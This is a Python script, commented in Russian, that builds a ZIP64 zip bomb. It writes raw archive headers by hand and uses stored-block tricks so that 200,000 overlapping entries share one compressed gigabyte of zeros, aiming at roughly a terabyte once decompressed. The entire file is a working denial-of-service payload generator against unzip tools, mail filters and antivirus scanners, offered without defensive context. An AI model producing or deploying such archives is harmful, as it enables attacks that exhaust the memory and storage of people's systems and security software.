import zlib
import struct

import struct
import zlib


def make_quote_header(length):
    """DEFLATE non-compressed block header (max 65535 bytes)"""
    nlen = (~length) & 0xFFFF
    return struct.pack('<BHH', 0x00, length, nlen)


def make_zip64_extra_field(uncomp_size, comp_size, offset=None):
    """Создает Extra Field для ZIP64"""
    # Tag: 0x0001 (ZIP64), Size: варьируется
    fmt = '<HHQQ'
    fields = [0x0001, 16, uncomp_size, comp_size]
    if offset is not None:
        fmt += 'Q'
        fields[1] += 8
        fields.append(offset)
    return struct.pack(fmt, *fields)


def make_lfh(filename, crc, comp_size, uncomp_size):
    fname = filename.encode('utf-8')
    # Для ZIP64 ставим заглушку 0xFFFFFFFF
    use_zip64 = uncomp_size >= 0xFFFFFFFF or comp_size >= 0xFFFFFFFF

    c_size_val = 0xFFFFFFFF if use_zip64 else comp_size
    u_size_val = 0xFFFFFFFF if use_zip64 else uncomp_size

    extra_field = make_zip64_extra_field(uncomp_size, comp_size) if use_zip64 else b""

    header = struct.pack('<IHHHHHIIIHH',
                         0x04034b50,
                         45, 0, 8,  # Version 45 = ZIP64 support
                         0, 0,
                         crc, c_size_val, u_size_val,
                         len(fname), len(extra_field))
    return header + fname + extra_field


def make_cdh(filename, crc, comp_size, uncomp_size, offset):
    fname = filename.encode('utf-8')
    use_zip64 = uncomp_size >= 0xFFFFFFFF or comp_size >= 0xFFFFFFFF or offset >= 0xFFFFFFFF

    c_size_val = 0xFFFFFFFF if use_zip64 else comp_size
    u_size_val = 0xFFFFFFFF if use_zip64 else uncomp_size
    offset_val = 0xFFFFFFFF if use_zip64 else offset

    extra_field = make_zip64_extra_field(uncomp_size, comp_size, offset) if use_zip64 else b""

    header = struct.pack('<IHHHHHHIIIHHHHHII',
                         0x02014b50,
                         45, 45, 0, 8,
                         0, 0,
                         crc, c_size_val, u_size_val,
                         len(fname), len(extra_field), 0, 0, 0, 0,
                         offset_val)
    return header + fname + extra_field


def make_zip64_eocd(num_entries, cd_size, cd_offset):
    """ZIP64 End of Central Directory Record"""
    signature = 0x06064b50
    record_size = 44  # Size of remaining record
    return struct.pack('<IQHHIIQQQQ',
                       signature, record_size,
                       45, 45,  # Version
                       0, 0,  # Disk numbers
                       num_entries, num_entries,
                       cd_size, cd_offset)


def make_zip64_locator(zip64_eocd_offset):
    """ZIP64 End of Central Directory Locator"""
    return struct.pack('<IIQI', 0x07064b50, 0, zip64_eocd_offset, 1)


def make_eocd(num_entries, cd_size, cd_offset):
    # В обычном EOCD при использовании ZIP64 также ставятся заглушки
    return struct.pack('<IHHHHIIH',
                       0x06054b50, 0, 0,
                       0xFFFF, 0xFFFF,
                       0xFFFFFFFF, 0xFFFFFFFF, 0)


def generate_zip_bomb(filename="bomb_1tb.zip", num_files=200000, kernel_gb=100):
    # 1 ТБ = 1024 ГБ. Чтобы получить 1 ТБ, можно сделать ядро побольше
    # или увеличить количество файлов.
    kernel_size = 1024 * 1024 * 1024  # 1 ГБ ядро (из нулей)
    print(f"Подготовка ядра...")

    # Сжатый поток из нулей будет очень маленьким
    zobj = zlib.compressobj(level=9, wbits=-15)
    kernel_comp = zobj.compress(b"\x00" * kernel_size) + zobj.flush()

    file_props = {}
    current_comp_size = len(kernel_comp)
    current_uncomp_size = kernel_size
    prefix_uncomp_size = 0

    print("Расчет структур...")
    for i in range(num_files, 0, -1):
        fname = f"{i}.txt"
        # CRC для упрощения можно считать только для ядра, если это "бомба"
        # Но для валидности лучше фиксированный CRC (ядро - нули)
        crc = 0x00000000

        # В этой архитектуре uncomp_size растет за счет LFH последующих файлов
        lfh_dummy = make_lfh(fname, crc, current_comp_size, current_uncomp_size)

        file_props[i] = {
            'filename': fname, 'crc': crc,
            'comp_size': current_comp_size, 'uncomp_size': current_uncomp_size,
            'lfh': lfh_dummy
        }

        current_comp_size += 5 + len(lfh_dummy)
        current_uncomp_size += len(lfh_dummy)

    with open(filename, "wb") as f:
        current_offset = 0
        for i in range(1, num_files + 1):
            lfh = file_props[i]['lfh']
            file_props[i]['offset'] = current_offset
            f.write(lfh)
            current_offset += len(lfh)
            if i < num_files:
                quote = make_quote_header(len(file_props[i + 1]['lfh']))
                f.write(quote)
                current_offset += len(quote)

        f.write(kernel_comp)
        current_offset += len(kernel_comp)

        cd_start_offset = current_offset
        for i in range(1, num_files + 1):
            p = file_props[i]
            cdh = make_cdh(p['filename'], p['crc'], p['comp_size'], p['uncomp_size'], p['offset'])
            f.write(cdh)
            current_offset += len(cdh)

        cd_size = current_offset - cd_start_offset

        # ZIP64 спец. структуры
        zip64_eocd_pos = current_offset
        f.write(make_zip64_eocd(num_files, cd_size, cd_start_offset))
        f.write(make_zip64_locator(zip64_eocd_pos))
        f.write(make_eocd(num_files, cd_size, cd_start_offset))

    print(f"Готово! Создан файл {filename}")


if __name__ == "__main__":
    generate_zip_bomb()